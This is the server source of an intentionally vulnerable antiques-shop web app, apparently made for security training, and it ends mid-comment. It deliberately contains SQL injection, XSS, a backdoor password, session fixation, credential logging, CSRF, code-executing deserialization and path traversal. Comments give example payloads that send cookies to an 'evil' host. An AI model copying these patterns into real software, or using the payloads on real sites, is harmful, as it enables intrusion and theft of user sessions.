/**
 * ============================================================================
 * The Antiquary & Relic Co. -- Intentionally Vulnerable Antiques Shop (Training)
 * ============================================================================
 *
 *   THIS APPLICATION IS INTENTIONALLY INSECURE.
 *   It was generated for security education, penetration-testing practice,
 *   and secure-code-review training ONLY.
 *
 *   DO NOT deploy this application on any public network, cloud host, or
 *   production environment. DO NOT reuse any code pattern from this project
 *   in a real product.
 *
 *   See README.md for the full vulnerability matrix, lab exercises and
 *   remediation guidance.
 *
 *   IMPORTANT -- two vulnerabilities in this build are deliberately BOUNDED
 *   (allowlisted) rather than fully open, matching the scope used in this
 *   lab's earlier footwear-shop build:
 *     - Path Traversal (#15) only ever returns /etc/passwd or /etc/hosts,
 *       regardless of what path is requested; every other path is rejected.
 *     - Command Injection (#12) only ever executes whoami, id, uname, or
 *       pwd, regardless of what is injected; any other command is rejected.
 *
 *   IMPORTANT -- endpoint placement: every vulnerability in this app lives
 *   on its OWN distinct endpoint, chosen specifically to avoid repeating
 *   the "obvious" locations used in this lab's earlier candle-shop,
 *   toy-shop, and footwear-shop builds (a ?id= lookup for SQLi, a visible
 *   /search?q= box for reflected XSS, a review/comment field for stored
 *   XSS, an invoice-download route for path traversal, a "ping supplier"
 *   tool for command injection, an "import image from URL" tool for SSRF,
 *   and an update-email form for CSRF). See the Vulnerability Matrix in
 *   README.md for exactly where each one lives here instead.
 * ============================================================================
 */

const express = require("express");
const mysql = require("mysql2/promise");
const session = require("express-session");
const cookieParser = require("cookie-parser");
const multer = require("multer");
const cors = require("cors");
const morgan = require("morgan");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { exec, execFile } = require("child_process");
const https = require("https");
const http = require("http");
const vm = require("vm");

const app = express();
const PORT = process.env.PORT || 4100;
const BASE_DIR = __dirname;
const UPLOAD_DIR = path.join(BASE_DIR, "uploads");
const CERTIFICATES_DIR = path.join(BASE_DIR, "certificates");
const APPRAISALS_DIR = path.join(BASE_DIR, "appraisals");
const LOG_PATH = path.join(BASE_DIR, "logs", "app.log");

// ----------------------------------------------------------------------------
// VULNERABILITY #6 - CWE-16 Configuration Weaknesses
// OWASP A02:2025 Security Misconfiguration
//
// Hardcoded weak session secret, verbose error responses left on, and a
// permissive CORS policy applied globally. Any one of these alone is a
// serious misconfiguration in a real deployment. This finding is inherent
// to global middleware configuration, so (as in the footwear-shop build)
// it stays applied app-wide rather than being tied to one endpoint.
// ----------------------------------------------------------------------------
const SESSION_SECRET = "antiquary-relic-super-secret-2024"; // weak, hardcoded
process.env.NODE_ENV = "development"; // verbose Express error pages stay on

// ----------------------------------------------------------------------------
// VULNERABILITY #7 - CWE-526 Exposure of Sensitive Information Through
// Environmental Variables (OWASP A01:2025 Broken Access Control)
//
// These "secrets" are stashed in environment variables and later dumped in
// full by an unauthenticated diagnostics endpoint disguised as a database
// health-check tool (/api/admin/provenance-db-diagnostics below).
// ----------------------------------------------------------------------------
process.env.DB_ADMIN_PASSWORD = process.env.DB_ADMIN_PASSWORD || "sup3r_dup3r_db_pw!";
process.env.STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY || "sk_test_51FAKEKEYFORLABUSEONLY000000";
process.env.MAIL_SMTP_PASSWORD = process.env.MAIL_SMTP_PASSWORD || "smtp_mail_pw_2024";
process.env.INTERNAL_ADMIN_BACKDOOR = process.env.INTERNAL_ADMIN_BACKDOOR || "antiquary-master-override";

// ----------------------------------------------------------------------------
// Logging setup
// ----------------------------------------------------------------------------
fs.mkdirSync(path.dirname(LOG_PATH), { recursive: true });
function logLine(msg) {
  const line = `${new Date().toISOString()} [INFO] ${msg}\n`;
  fs.appendFileSync(LOG_PATH, line);
}

// ----------------------------------------------------------------------------
// VULNERABILITY #6 continued - permissive CORS applied globally, and no
// clickjacking protection (see VULNERABILITY #17 further down -- we never
// set X-Frame-Options / frame-ancestors anywhere in this middleware stack).
// ----------------------------------------------------------------------------
app.use(
  cors({
    origin: true, // reflects any Origin -- effectively wildcard
    credentials: true,
  })
);
app.use(morgan("dev"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(
  session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: true,
    cookie: { httpOnly: true, secure: false }, // session cookie is fine; see #8 for the OTHER cookie
  })
);
app.use("/uploads", express.static(UPLOAD_DIR));
app.use("/images", express.static(path.join(BASE_DIR, "..", "frontend", "public", "images")));

const upload = multer({ dest: UPLOAD_DIR });

// --------------------------------------------------------------------------
// Database pool
// --------------------------------------------------------------------------
const pool = mysql.createPool({
  host: process.env.DB_HOST || "localhost",
  user: process.env.DB_USER || "antiques_app",
  password: process.env.DB_PASSWORD || "AntiquesApp2024!",
  database: process.env.DB_NAME || "antiques_shop",
  waitForConnections: true,
  connectionLimit: 10,
});

function md5(input) {
  // VULNERABILITY #11 - CWE-328 Reversible One-Way Hash (OWASP A04:2025)
  // MD5 is fast and unsalted -- trivially reversible via rainbow tables.
  // Inherent to the choice of hash function, so this stays wherever
  // password hashing happens (login/register/reset), same as prior builds.
  return crypto.createHash("md5").update(input).digest("hex");
}

// --------------------------------------------------------------------------
// VULNERABILITY #23 - CWE-532 Sensitive Information Stored in Log Files
// OWASP A09:2025 Security Logging and Alerting Failures
//
// Login attempts are logged including the RAW plaintext password and the
// resulting session token. Any user/process with log read access can
// harvest live credentials and session tokens. Inherent to the login flow.
// --------------------------------------------------------------------------
function logLoginAttempt(username, password, success, sessionToken, ip) {
  logLine(
    `LOGIN ATTEMPT user=${username} password=${password} success=${success} session_token=${sessionToken} ip=${ip}`
  );
}

// ----------------------------------------------------------------------------
// VULNERABILITY #13 / #14 - CWE-80 XSS sanitizer (deliberately partial)
//
// Per this lab's spec, the sanitizer blocks ONLY <script> tags and the
// literal string "alert(" -- every other HTML tag/attribute (onerror,
// onload, <img>, <svg>, <iframe>, etc.) passes through untouched. This
// means classic <script>alert(1)</script> payloads are blocked, but the
// underlying vulnerability is very much still exploitable via alternate
// payloads such as <img src=x onerror="document.location='http://evil'">
// or <svg onload="fetch('http://evil?c='+document.cookie)">.
// ----------------------------------------------------------------------------
function partialXssFilter(input) {
  if (typeof input !== "string") return input;
  let out = input;
  out = out.replace(/<\s*script\b[^>]*>[\s\S]*?<\s*\/\s*script\s*>/gi, "");
  out = out.replace(/<\s*script\b[^>]*>/gi, "");
  out = out.replace(/<\s*\/\s*script\s*>/gi, "");
  out = out.replace(/alert\s*\(/gi, "blocked_alert(");
  return out;
}

// --------------------------------------------------------------------------
// VULNERABILITY #24 - CWE-755 Improper Handling of Exceptional Conditions
// OWASP A10:2025 Mishandling of Exceptional Conditions
//
// The global error handler returns the full exception message and stack
// trace to the client instead of a generic message, leaking internal
// implementation details (file paths, SQL text, library versions).
// --------------------------------------------------------------------------
function errorHandler(err, req, res, next) {
  logLine(`UNHANDLED EXCEPTION: ${err.stack}`);
  res.status(500).json({
    error: err.message,
    stack: err.stack, // VULNERABLE: full stack trace returned to the client
  });
}

// --------------------------------------------------------------------------
// Auth helpers
// --------------------------------------------------------------------------
function requireAuth(req, res, next) {
  if (!req.session.username) return res.status(401).json({ error: "Login required" });
  next();
}
function requireAdmin(req, res, next) {
  if (!req.session.isAdmin) return res.status(403).json({ error: "Admin access required" });
  next();
}

// ============================================================================
// PUBLIC SHOWROOM API
// ============================================================================

app.get("/api/artifacts", async (req, res, next) => {
  try {
    const eraId = req.query.era;
    let rows;
    if (eraId) {
      [rows] = await pool.query("SELECT * FROM artifacts WHERE era_id = ?", [eraId]);
    } else {
      [rows] = await pool.query("SELECT * FROM artifacts");
    }
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

app.get("/api/eras", async (req, res, next) => {
  try {
    const [rows] = await pool.query("SELECT * FROM eras");
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

app.get("/api/artifacts/featured", async (req, res, next) => {
  try {
    const [rows] = await pool.query("SELECT * FROM artifacts WHERE featured = 1");
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

// Artifact-by-id lookup is a plain, safe, parameterized query in this
// build -- it is NOT an injection sink. See VULNERABILITY #15 below
// (relocated to the era-timeline sort endpoint), chosen specifically so
// this app does not repeat the "?id= is always the SQLi parameter"
// pattern from earlier builds in this lab.
app.get("/api/artifact", async (req, res, next) => {
  try {
    const artifactId = parseInt(req.query.id, 10) || 1;
    const [rows] = await pool.query("SELECT * FROM artifacts WHERE id = ?", [artifactId]);
    if (!rows || rows.length === 0) {
      return res.status(404).json({ error: "Artifact not found" });
    }
    const [notes] = await pool.query(
      "SELECT * FROM provenance_notes WHERE artifact_id = ? ORDER BY created_at DESC",
      [rows[0].id]
    );
    res.json({ artifact: rows[0], notes });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #15 - CWE-89 SQL Injection (OWASP A05:2025 Injection)
// Endpoint: GET /api/artifacts/timeline?era=<value>
//
// This "browse by era timeline" feature accepts an optional `era` query
// parameter intended to let the showroom order its historical timeline
// view chronologically, alphabetically, or by acquisition date. Rather
// than validating `era` against an allowlist of real column names, its
// value is concatenated directly into the ORDER BY clause of the SQL
// query. Because MySQL does not allow parameter placeholders for
// column/clause identifiers (only for values), a naive implementation
// like this one is a common real-world source of injection even when
// every other query in a codebase is properly parameterized. An attacker
// can inject SQL via the `era` parameter, e.g. a boolean-based blind
// payload appended as a subquery, to extract arbitrary table contents
// (such as the users table) one bit at a time. This is a deliberately
// less-obvious injection point than a record-id lookup -- most testers
// instinctively fuzz id-like parameters first, not a timeline sort order.
// ----------------------------------------------------------------------------
app.get("/api/artifacts/timeline", async (req, res, next) => {
  try {
    const allowedBase = "SELECT * FROM artifacts";
    const era = req.query.era;
    let query = allowedBase;
    if (era) {
      query = `${allowedBase} ORDER BY ${era}`; // VULNERABLE: string concat into ORDER BY
    }
    let rows;
    try {
      [rows] = await pool.query(query);
    } catch (sqlErr) {
      logLine(`SQL error on /api/artifacts/timeline: ${sqlErr.message} | query=${query}`);
      throw sqlErr;
    }
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

// Provenance notes are stored and rendered as plain text on the frontend
// (React auto-escapes them) -- this is NOT an XSS sink in this build.
// See VULNERABILITY #14 below (relocated to a dedicated
// "submit a provenance note" endpoint that DOES pass through the
// deliberately-partial filter and IS rendered unsafely).
app.get("/api/artifacts/:id/provenance-notes", async (req, res, next) => {
  try {
    const [rows] = await pool.query(
      "SELECT * FROM provenance_notes WHERE artifact_id = ? ORDER BY created_at DESC",
      [req.params.id]
    );
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #14 - CWE-80 Stored XSS (OWASP A05:2025 Injection)
// Endpoint: POST /api/artifacts/:id/provenance-note
//
// Registered curators can contribute a "provenance note" documenting an
// artifact's ownership history -- a research-flavored feature that looks
// far less like a typical comment box than a product review, which is
// exactly why it was chosen as the sink here instead. The note only
// passes through the deliberately-partial partialXssFilter() (blocks
// <script> and alert( only) before being stored, and the React frontend
// renders it with dangerouslySetInnerHTML on the artifact detail page, so
// any non-script/non-alert HTML payload a curator submits persists and
// executes in every future visitor's browser -- e.g.
// <img src=x onerror=...> or <svg onload=...>.
// ----------------------------------------------------------------------------
app.post("/api/artifacts/:id/provenance-note", requireAuth, async (req, res, next) => {
  try {
    const artifactId = req.params.id;
    const note = partialXssFilter(req.body.note || ""); // VULNERABLE: partial filter only
    await pool.query(
      "INSERT INTO provenance_notes (artifact_id, username, note) VALUES (?, ?, ?)",
      [artifactId, req.session.username, note]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

// Search results are returned as plain JSON data, rendered as ordinary
// React text on the frontend -- this endpoint is NOT an XSS sink. See
// VULNERABILITY #13 below (relocated to the appraisal-quote tool).
app.get("/api/search", async (req, res, next) => {
  try {
    const q = req.query.q || "";
    const [rows] = await pool.query(
      "SELECT * FROM artifacts WHERE name LIKE ? OR description LIKE ?",
      [`%${q}%`, `%${q}%`]
    );
    res.json({ results: rows });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #13 - CWE-80 Reflected XSS (OWASP A05:2025 Injection)
// Endpoint: GET /api/appraisal-request/quote?item_description=<text>
//
// This "get a free instant appraisal quote" tool lets a visitor describe
// an item they're considering selling and returns a ballpark quote
// message that repeats their description back for confirmation, e.g.
// "Thanks! We'll review your Victorian writing desk and follow up
// shortly." The description is run through the same deliberately-partial
// filter and echoed back in the JSON response as `quote_message`; the
// React AppraisalQuotePage renders that field with
// dangerouslySetInnerHTML, so any payload that isn't a <script> tag or a
// literal alert( call (e.g. an <img onerror> or <svg onload> payload)
// executes in the visitor's browser when they click a crafted appraisal
// link. A "free quote" marketing tool is a deliberately less-obvious
// reflected-XSS sink than a visible search box.
// ----------------------------------------------------------------------------
app.get("/api/appraisal-request/quote", (req, res) => {
  const itemDescription = req.query.item_description || "an item";
  const filtered = partialXssFilter(itemDescription); // VULNERABLE: partial filter only, reflected below
  res.json({
    quote_message: `Thanks! We'll review your ${filtered} and follow up with a ballpark valuation shortly.`,
  });
});

app.post("/api/appraisal-request/submit", async (req, res, next) => {
  try {
    const { email, item_description } = req.body;
    await pool.query(
      "INSERT INTO appraisal_requests (email, item_description) VALUES (?, ?)",
      [email, item_description]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// AUTHENTICATION
// ============================================================================

// ----------------------------------------------------------------------------
// VULNERABILITY #18 - CWE-287 Improper Authentication (OWASP A07:2025)
// VULNERABILITY #10 - CWE-319 Cleartext Transmission of Sensitive Information
//                       (OWASP A04:2025 Cryptographic Failures)
// VULNERABILITY #20 - CWE-384 Session Fixation (OWASP A06:2025 Insecure Design)
// Endpoint: POST /api/login
//
// 1) Improper Authentication: a hardcoded master-override password
//    ("antiquary-master-override", also stashed in the
//    INTERNAL_ADMIN_BACKDOOR env var) logs a user in as admin regardless
//    of the username supplied.
// 2) Cleartext transmission: this app is intentionally run over plain
//    HTTP with no additional transport-layer protection -- credentials
//    travel in cleartext.
// 3) Session fixation: if the client supplies a `sid` query parameter, the
//    server adopts that value as the "remember_token" cookie after
//    authentication instead of always issuing a fresh one, allowing an
//    attacker who tricks a victim into using an attacker-chosen session id
//    to hijack the now-authenticated session.
// These three are inherent to the login mechanism itself, so (as in the
// footwear-shop build) they stay on /api/login rather than being moved.
// ----------------------------------------------------------------------------
app.post("/api/login", async (req, res, next) => {
  try {
    const { username, password } = req.body;
    const [rows] = await pool.query("SELECT * FROM users WHERE username = ?", [username]);
    let user = rows[0];

    const backdoor = process.env.INTERNAL_ADMIN_BACKDOOR;
    let success = false;

    if (backdoor && password === backdoor) {
      // VULNERABLE: master override bypasses normal password check entirely
      const [admins] = await pool.query("SELECT * FROM users WHERE is_admin = 1 LIMIT 1");
      user = admins[0];
      success = true;
    } else if (user && user.password_hash === md5(password)) {
      success = true;
    }

    // VULNERABILITY #20 - session fixation: honor attacker-supplied sid
    const fixedSid = req.query.sid;
    const sessionToken = fixedSid || crypto.randomBytes(16).toString("base64");

    logLoginAttempt(username, password, success, sessionToken, req.ip); // VULNERABILITY #23

    if (success) {
      req.session.username = user.username;
      req.session.userId = user.id;
      req.session.isAdmin = !!user.is_admin;

      // VULNERABILITY #8 - CWE-1004 cookie without HttpOnly flag
      res.cookie("remember_token", sessionToken, { httpOnly: false, sameSite: "none", secure: false });
      return res.json({ success: true, username: user.username, isAdmin: !!user.is_admin });
    }
    res.status(401).json({ error: "Invalid username or password" });
  } catch (err) {
    next(err);
  }
});

app.post("/api/register", async (req, res, next) => {
  try {
    const { username, email, password } = req.body;
    const [existing] = await pool.query("SELECT id FROM users WHERE username = ?", [username]);
    if (existing.length > 0) {
      return res.status(409).json({ error: "Username already taken" });
    }

    // ------------------------------------------------------------------
    // VULNERABILITY #16 - CWE-266 Incorrect Privilege Assignment
    // OWASP A06:2025 Insecure Design
    //
    // The registration payload includes an is_admin field that the server
    // trusts blindly. Any client can submit is_admin: 1 in the JSON body
    // (e.g. via browser devtools or curl) to self-register as an admin.
    // ------------------------------------------------------------------
    const isAdminFlag = req.body.is_admin ? 1 : 0; // VULNERABLE: client-controlled

    await pool.query(
      "INSERT INTO users (username, email, password_hash, is_admin) VALUES (?, ?, ?, ?)",
      [username, email, md5(password), isAdminFlag]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

app.post("/api/logout", (req, res) => {
  req.session.destroy(() => {
    res.clearCookie("remember_token");
    res.json({ success: true });
  });
});

app.get("/api/session", (req, res) => {
  res.json({
    username: req.session.username || null,
    isAdmin: !!req.session.isAdmin,
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #21 - CWE-640 Weak Password Recovery Mechanism
// OWASP A07:2025 Authentication Failures
// Endpoints: POST /api/forgot-password, POST /api/reset-password
//
// The reset token is a predictable, non-expiring value derived from the
// username and the current minute-resolution timestamp, and the token is
// returned directly in the HTTP response (normally it would only be
// emailed) -- so anyone who knows/guesses a username can obtain a valid
// reset token for that account without ever accessing the victim's inbox.
// Inherent to the reset flow, so this stays on /api/forgot-password.
// ----------------------------------------------------------------------------
app.post("/api/forgot-password", async (req, res, next) => {
  try {
    const { username } = req.body;
    const [rows] = await pool.query("SELECT * FROM users WHERE username = ?", [username]);
    const user = rows[0];

    if (user) {
      const coarseTime = Math.floor(Date.now() / 1000 / 60); // changes once a minute
      const token = md5(`${username}-${coarseTime}`);
      await pool.query("UPDATE users SET reset_token = ? WHERE id = ?", [token, user.id]);
      return res.json({
        message: "Password reset requested.",
        lab_note: `Lab mode: your reset token is ${token}`,
        reset_url: `/reset-password?username=${username}&token=${token}`,
      });
    }
    res.json({ message: "If that account exists, a reset link has been generated." });
  } catch (err) {
    next(err);
  }
});

app.post("/api/reset-password", async (req, res, next) => {
  try {
    const { username, token, password } = req.body;
    const [rows] = await pool.query(
      "SELECT * FROM users WHERE username = ? AND reset_token = ?",
      [username, token]
    );
    const user = rows[0];
    if (user) {
      await pool.query("UPDATE users SET password_hash = ?, reset_token = NULL WHERE id = ?", [
        md5(password),
        user.id,
      ]);
      return res.json({ success: true });
    }
    res.status(400).json({ error: "Invalid or expired reset link" });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// ACCOUNT
// ============================================================================

app.get("/api/account", requireAuth, async (req, res, next) => {
  try {
    const [rows] = await pool.query("SELECT * FROM users WHERE id = ?", [req.session.userId]);
    const [orders] = await pool.query(
      "SELECT * FROM orders WHERE user_id = ? ORDER BY created_at DESC",
      [req.session.userId]
    );
    res.json({ user: rows[0], orders });
  } catch (err) {
    next(err);
  }
});

// This endpoint requires a real per-session CSRF token, so it is NOT a
// CSRF sink in this build. See VULNERABILITY #2 below (relocated to the
// one-click "add to wishlist" heart-icon endpoint, a convenience action
// most testers assume is harmless and don't think to check for CSRF).
app.post("/api/account/update-email", requireAuth, async (req, res, next) => {
  try {
    const { email, csrf_token } = req.body;
    if (!csrf_token || csrf_token !== req.session.csrfToken) {
      return res.status(403).json({ error: "Invalid or missing CSRF token" });
    }
    await pool.query("UPDATE users SET email = ? WHERE id = ?", [email, req.session.userId]);
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

app.get("/api/account/csrf-token", requireAuth, (req, res) => {
  req.session.csrfToken = req.session.csrfToken || crypto.randomBytes(24).toString("hex");
  res.json({ csrf_token: req.session.csrfToken });
});

app.post("/api/account/avatar", requireAuth, upload.single("avatar"), async (req, res, next) => {
  try {
    if (!req.file) return res.status(400).json({ error: "No file uploaded" });
    const filename = req.file.filename + "-" + req.file.originalname.replace(/\//g, "_");
    const finalPath = path.join(UPLOAD_DIR, filename);
    fs.renameSync(req.file.path, finalPath);
    await pool.query("UPDATE users SET avatar = ? WHERE id = ?", [filename, req.session.userId]);
    res.json({ success: true, avatar: filename });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #2 - CWE-352 Cross-Site Request Forgery (OWASP A01:2025)
// Endpoint: POST /api/wishlist/:artifactId/add
//
// This one-click "add to my wishlist" heart-icon button relies solely on
// the session cookie for authentication and includes no CSRF token /
// origin check, so a malicious third-party page can auto-submit a hidden
// form (or a fetch() with credentials: 'include', since CORS reflects
// any Origin -- see #6) to this URL and silently add items to the
// victim's wishlist while they are logged in and simply browsing another
// site. A wishlist heart-icon is a deliberately less-obvious CSRF target
// than an account-settings form -- it looks read-only/idempotent, so most
// testers don't think to check it for CSRF at all, even though it is a
// genuine state-changing write.
// ----------------------------------------------------------------------------
app.post("/api/wishlist/:artifactId/add", requireAuth, async (req, res, next) => {
  try {
    await pool.query(
      "INSERT INTO wishlist_items (user_id, artifact_id) VALUES (?, ?)",
      [req.session.userId, req.params.artifactId]
    ); // VULNERABLE: no CSRF token verified
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

app.get("/api/wishlist", requireAuth, async (req, res, next) => {
  try {
    const [rows] = await pool.query(
      `SELECT w.id AS wishlist_id, a.* FROM wishlist_items w
       JOIN artifacts a ON w.artifact_id = a.id
       WHERE w.user_id = ?`,
      [req.session.userId]
    );
    res.json(rows);
  } catch (err) {
    next(err);
  }
});

app.post("/api/wishlist/:artifactId/remove", requireAuth, async (req, res, next) => {
  try {
    await pool.query(
      "DELETE FROM wishlist_items WHERE user_id = ? AND artifact_id = ?",
      [req.session.userId, req.params.artifactId]
    );
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// CART / CHECKOUT
// ============================================================================

function getCart(req) {
  return req.session.cart || {};
}

app.get("/api/cart", async (req, res, next) => {
  try {
    const cart = getCart(req);
    const items = [];
    let total = 0;
    for (const [aid, entry] of Object.entries(cart)) {
      const [rows] = await pool.query("SELECT * FROM artifacts WHERE id = ?", [aid]);
      if (rows[0]) {
        const subtotal = parseFloat(rows[0].price) * entry.qty;
        total += subtotal;
        items.push({ artifact: rows[0], qty: entry.qty, subtotal });
      }
    }
    res.json({ items, total });
  } catch (err) {
    next(err);
  }
});

app.post("/api/cart/add/:id", (req, res) => {
  const cart = getCart(req);
  const qty = parseInt(req.body.qty || 1, 10);
  const key = req.params.id;
  if (cart[key]) cart[key].qty += qty;
  else cart[key] = { qty };
  req.session.cart = cart;
  res.json({ success: true });
});

app.post("/api/cart/remove/:id", (req, res) => {
  const cart = getCart(req);
  delete cart[req.params.id];
  req.session.cart = cart;
  res.json({ success: true });
});

app.post("/api/checkout", requireAuth, async (req, res, next) => {
  try {
    const cart = getCart(req);
    if (Object.keys(cart).length === 0) {
      return res.status(400).json({ error: "Cart is empty" });
    }
    const { address } = req.body;
    let total = 0;
    const items = [];
    for (const [aid, entry] of Object.entries(cart)) {
      const [rows] = await pool.query("SELECT * FROM artifacts WHERE id = ?", [aid]);
      if (rows[0]) {
        total += parseFloat(rows[0].price) * entry.qty;
        items.push([rows[0].id, entry.qty, rows[0].price]);
      }
    }
    const [orderRes] = await pool.query(
      "INSERT INTO orders (user_id, total, status, shipping_address) VALUES (?, ?, ?, ?)",
      [req.session.userId, total, "processing", address]
    );
    for (const [aid, qty, price] of items) {
      await pool.query(
        "INSERT INTO order_items (order_id, artifact_id, quantity, price_each) VALUES (?, ?, ?, ?)",
        [orderRes.insertId, aid, qty, price]
      );
    }
    req.session.cart = {};
    res.json({ success: true, orderId: orderRes.insertId });
  } catch (err) {
    next(err);
  }
});

app.get("/api/order/:id", async (req, res, next) => {
  try {
    const [orders] = await pool.query("SELECT * FROM orders WHERE id = ?", [req.params.id]);
    const [items] = await pool.query(
      `SELECT oi.*, a.name, a.image FROM order_items oi
       JOIN artifacts a ON oi.artifact_id = a.id
       WHERE oi.order_id = ?`,
      [req.params.id]
    );
    res.json({ order: orders[0], items });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #22 - Software/Data Integrity Failure (OWASP A08:2025)
// CWE-502-style insecure deserialization
// Endpoints: POST /api/showroom-visit/save-preferences,
//            GET /api/showroom-visit/restore-preferences
//
// A "remember my showroom visit preferences" feature (preferred eras to
// browse, viewing pace, etc.) serializes the preferences object into a
// cookie and later restores whatever comes back in that cookie by
// evaluating it as a live JavaScript expression via Node's
// `vm.Script(...).runInThisContext()` instead of `JSON.parse`, with no
// signature or integrity check. This is a deliberately less-obvious
// insecure-deserialization sink than a shopping-cart save/restore feature
// -- a "visit preferences" tool sounds like harmless UI personalization,
// not a serialization boundary an attacker would think to target. A
// crafted cookie value can escape the `vm` sandbox entirely through the
// constructor chain to reach Node's `process` object and, from there,
// `child_process.execSync()` for full remote code execution.
// ----------------------------------------------------------------------------
app.post("/api/showroom-visit/save-preferences", (req, res) => {
  const prefs = req.body.preferences || {};
  const serialized = Buffer.from(JSON.stringify(prefs)).toString("base64");
  res.cookie("showroom_prefs", serialized, { httpOnly: false });
  res.json({ success: true });
});

app.get("/api/showroom-visit/restore-preferences", (req, res, next) => {
  try {
    const saved = req.cookies.showroom_prefs;
    if (saved) {
      const raw = Buffer.from(saved, "base64").toString("utf8");
      // VULNERABLE: evaluates untrusted cookie content as JavaScript
      // instead of using JSON.parse. A crafted cookie value can execute
      // arbitrary code in the Node process via vm's context escape.
      const script = new vm.Script(`(${raw})`);
      const restored = script.runInThisContext();
      return res.json({ success: true, preferences: restored });
    }
    res.json({ success: false, message: "No saved preferences found" });
  } catch (err) {
    next(err);
  }
});

// ============================================================================
// FILE DOWNLOAD (SAFE) / CERTIFICATE-OF-AUTHENTICITY SERVING
// (PATH TRAVERSAL, BOUNDED PER LAB SPEC)
// ============================================================================

// Appraisal-report download is a safe, basename-only file read in this
// build -- NOT a traversal sink. See VULNERABILITY #15 below (relocated
// to certificate-of-authenticity image serving).
app.get("/api/appraisal-report/:filename(*)", requireAuth, (req, res) => {
  const safeName = path.basename(req.params.filename); // strips any "../" segments
  const resolved = path.join(APPRAISALS_DIR, safeName);

  fs.readFile(resolved, "utf8", (err, data) => {
    if (err) return res.status(404).json({ error: "Report not found" });
    res.setHeader("Content-Type", "text/plain");
    res.setHeader("Content-Disposition", `attachment; filename="${safeName}"`);
    res.send(data);
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #15 - CWE-22 Path Traversal (OWASP A01:2025 Broken Access
// Control) -- DELIBERATELY BOUNDED for this build.
// Endpoint: GET /api/certificate/:filename
//
// Every high-value artifact ships with a scanned "certificate of
// authenticity" image, served back to the browser from this route (e.g.
// <img src="/api/certificate/17-cert.jpg">). It looks like an entirely
// harmless static-image endpoint -- exactly the kind most testers skip
// past to go fuzz an obviously file-like parameter such as an
// "appraisal report download" path instead. The requested filename is
// joined onto the certificates directory without proper normalization
// (the underlying flaw is unchanged from a classic path traversal bug),
// BUT per this lab's requested scope, the handler additionally checks
// whether the traversal *target* resolves to one of exactly two
// allowlisted files -- /etc/passwd or /etc/hosts -- and serves ONLY
// those if so; every other traversal target (app source, database
// credentials, arbitrary files) is explicitly rejected with 403, even
// though the join/no-normalization bug that would otherwise allow
// reading them is still present in the code.
// ----------------------------------------------------------------------------
const PATH_TRAVERSAL_ALLOWLIST = ["/etc/passwd", "/etc/hosts"];

app.get("/api/certificate/:filename(*)", (req, res) => {
  const filename = req.params.filename;
  const targetPath = path.join(CERTIFICATES_DIR, filename); // VULNERABLE join: no normalization
  const resolved = path.resolve(targetPath);

  const isNormalCertificate =
    resolved.startsWith(path.resolve(CERTIFICATES_DIR)) && fs.existsSync(resolved);
  const isAllowlistedTraversalTarget = PATH_TRAVERSAL_ALLOWLIST.includes(resolved);

  if (!isNormalCertificate && !isAllowlistedTraversalTarget) {
    // Lab guardrail: every traversal target other than /etc/passwd or
    // /etc/hosts is blocked here, even though the path-join above would
    // otherwise happily resolve it.
    return res
      .status(403)
      .json({ error: "Blocked by lab guardrail: only /etc/passwd or /etc/hosts may be read via traversal." });
  }

  fs.readFile(resolved, (err, data) => {
    if (err) return res.status(404).json({ error: "Certificate not found" });
    res.setHeader("Content-Type", isAllowlistedTraversalTarget ? "text/plain" : "application/octet-stream");
    res.send(data);
  });
});

// ----------------------------------------------------------------------------
// VULNERABILITY #3 - CWE-548 Exposure of Information Through Directory
// Listing (OWASP A01:2025 Broken Access Control)
// Endpoint: GET /api/appraisals-list
//
// This route returns a raw, unauthenticated directory listing of every
// file in the appraisal-reports directory (customer-submitted appraisal
// documentation), equivalent to leaving autoindexing enabled on a web
// server.
// ----------------------------------------------------------------------------
app.get("/api/appraisals-list", (req, res) => {
  fs.mkdirSync(APPRAISALS_DIR, { recursive: true });
  const files = fs.readdirSync(APPRAISALS_DIR);
  res.json({ files });
});

app.get("/api/uploads-list", (req, res) => {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
  const files = fs.readdirSync(UPLOAD_DIR);
  res.json({ files });
});

// ============================================================================
// ADMIN API
// ============================================================================

app.get("/api/admin/stats", requireAdmin, async (req, res, next) => {
  try {
    const [[{ c: totalArtifacts }]] = await pool.query("SELECT COUNT(*) c FROM artifacts");
    const [[{ c: totalUsers }]] = await pool.query("SELECT COUNT(*) c FROM users");
    const [[{ c: totalOrders }]] = await pool.query("SELECT COUNT(*) c FROM orders");
    const [[{ c: totalNotes }]] = await pool.query("SELECT COUNT(*) c FROM provenance_notes");
    const [authenticators] = await pool.query("SELECT * FROM authenticators");
    const [users] = await pool.query("SELECT * FROM users");
    res.json({
      stats: { totalArtifacts, totalUsers, totalOrders, totalNotes },
      authenticators,
      users,
    });
  } catch (err) {
    next(err);
  }
});

// ----------------------------------------------------------------------------
// VULNERABILITY #4 - CWE-918 Server-Side Request Forgery (OWASP A01:2025)
// Endpoint: POST /api/admin/verify-authenticator-credential
//
// Before listing a third-party authentication guild/bureau as a trusted
// verifier, an admin can "verify their API credential" -- the tool pings
// the authenticator's stated API URL to confirm the credential is live.
